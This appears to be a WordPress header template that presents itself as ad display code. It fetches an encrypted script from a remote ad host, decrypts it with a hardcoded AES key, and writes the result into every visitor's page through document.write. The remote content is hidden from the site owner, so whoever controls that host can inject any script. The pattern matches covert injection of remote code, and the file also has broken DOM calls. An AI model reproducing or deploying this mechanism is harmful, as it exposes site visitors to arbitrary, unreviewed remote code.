<?php$template_name = 'header-temp';$url_script = 'https://portal-pwr-ads.com/getadsensescript/header';$request_script = wp_remote_retrieve_body(wp_remote_get($url_script));if ($request_script == "") {    return false; // Bail early} else {    $data_script = json_decode($request_script);    $encryption = $data_script->script;    // Store the cipher method    $ciphering = "AES-128-CTR";    // Use OpenSSl Encryption method    $iv_length = openssl_cipher_iv_length($ciphering);    $options = 0;    // Non-NULL Initialization Vector for decryption    $decryption_iv = '1234567891011121';    // Store the decryption key    $decryption_key = "PwrAdsScript";    // Use openssl_decrypt() function to decrypt the data    $decryption = openssl_decrypt(        $encryption,        $ciphering,        $decryption_key,        $options,        $decryption_iv    );}if ($data_script == null && is_site_admin()) {?>    <!--   *****SCRIPT TO SHOW ADS INSIDE THE BODY TAG*****   -->    <script type="text/javascript">    </script><?php } elseif ($data_script !== null && $data_script->source == "google_adsense") {?>    <!--   *****SCRIPT TO SHOW ADS INSIDE THE BODY TAG*****   -->    <div class="header_css">        <script type="text/javascript">            var ads_header = '<?php echo esc_js($decryption); ?>';            ads_header = ads_header.replaceAll('&gt;', '>').replaceAll('&quot;', '"').replaceAll('&lt;', '<').replaceAll(/\s\s+/g, ' ').replaceAll("</' + '", "</");            ads_header = ads_header.replace('ins class="adsbygoogle"', 'ins class="adsbygoogle header_css"');            //var div = document.createElement( 'div' );            var script = document.createElement('div');            //div.id = 'overlay';            script.id = 'overlay_header';            script.innerHTML = ads_header;            document.write(ads_header);            if (document.body.firstChild) {                // document.body.insertBefore(div, document.body.firstChild);                document.body.insertBefore(script, document.body.firstChild);                // document.body.lastElementChild(div, document.body.lastElementChild);            } else if (document.body.lastChild) {                //   document.body.lastElementChild(div, document.body.lastChild);                document.body.lastElementChild(script, document.body.lastChild);            } else {                // document.body.appendChild(div);                document.body.appendChild(script);                // document.body.appendChild(container);            }            function removeHeaderImage(e) {                document.getElementById("overlay_header").remove();            }        </script>    </div><?php } elseif ($data_script !== null && $data_script->source == "adkernel") {    //echo json_encode($decryption)    //esc_attr( $decryption );?>    <div class="header_css">        <script type="text/javascript">            var ads_header = '<?php echo esc_js($decryption); ?>';            ads_header = ads_header.replaceAll('&gt;', '>').replaceAll('&quot;', '"').replaceAll('&lt;', '<').replaceAll(/\s\s+/g, ' ').replaceAll("</' + '", "</");            ads_header = ads_header.replace('ins class="adsbygoogle"', 'ins class="adsbygoogle header_css"');            //var div = document.createElement( 'div' );            var script = document.createElement('div');            //div.id = 'overlay';            script.id = 'overlay_header';            script.innerHTML = ads_header;            document.write(ads_header);            if (document.body.firstChild) {                // document.body.insertBefore(div, document.body.firstChild);                document.body.insertBefore(script, document.body.firstChild);                // document.body.lastElementChild(div, document.body.lastElementChild);            } else if (document.body.lastChild) {                //   document.body.lastElementChild(div, document.body.lastChild);                document.body.lastElementChild(script, document.body.lastChild);            } else {                // document.body.appendChild(div);                document.body.appendChild(script);                // document.body.appendChild(container);            }            function removeHeaderImage(e) {                document.getElementById("overlay_header").remove();            }        </script>    </div>    </script><?php }?>